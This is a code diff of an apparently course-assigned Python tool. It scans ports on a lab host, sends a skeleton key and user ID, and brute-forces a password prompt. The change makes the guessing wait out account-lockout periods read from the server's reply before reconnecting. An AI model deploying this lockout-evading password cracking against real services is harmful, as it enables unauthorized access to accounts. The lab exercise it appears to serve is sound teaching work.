@@ -6,7 +6,6 @@ import datetime
 import argparse
 HOST = '192.168.1.10'
 PORT = 10247
-# HOST = '127.0.0.1'
 SKELETONKEY = 'Passepartout'
 BYTES = 100000
 CRUZID = 'bosdhill'
@@ -153,11 +152,11 @@ def crack_password():
                     s.close()
                     # pass to next function
                     break
-          elif data == 'Too many failed login attempts, account is locked for the next 600 seconds, goodbye.\n':
+          else:
                # print("\tOut of tries!")
                # print("\t\tSleep for %d seconds at %s" % (602, str(datetime.datetime.now())))
                s.close()
-               time.sleep(602)
+               time.sleep(get_blackout_period_from(data) + 2)
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                # print("\t\tReconnecting to %s over port %d..." % (HOST, PORT))
                s.connect((HOST, PORT))
@@ -169,26 +168,39 @@ def crack_password():
                s.sendall(CRUZID)
                data = s.recv(BYTES)
 
-def try_ports():
+def scan_ports():
      global PORT
-     fp = open("out", "r")
-     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+     fp = open("ports", "r")
      for _, line in enumerate(fp):
           port = re.findall("[0-9]{5}", line)
           PORT = int(port[0])
+          if PORT == 10243:
+               continue
+          s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+          print("connecting to PORT %d" % PORT)
           s.connect((HOST, PORT))
-          s.sendall(SKELETONKEY)
-          time.sleep(2)
+          s.sendall(bytes(SKELETONKEY, 'utf-8'))
           data = s.recv(BYTES)
-          s.sendall(CRUZID + '\n')
+          s.sendall(bytes(CRUZID + '\n', 'utf-8'))
           data = s.recv(BYTES)
-          if data == 'Password: ':
-               # print('Received %s from port %d' % (repr(data), PORT))
+          s.close()
+          print("data received",data)
+          if data.decode('utf-8') == 'Password: ':
+               print('Received %s from port %d' % (data.decode('utf-8'), PORT))
                crack_password()
 
-
 def main():
-     parse()
+     global HOST
+     global SKELETONKEY
+     global CRUZID
+     global DICTIONARY
+     args = parse()
+     HOST = args.ip
+     SKELETONKEY = args.key
+     CRUZID = args.user
+     DICTIONARY = args.dict
+     scan_ports()
+
 
 if __name__ == "__main__":
      main()
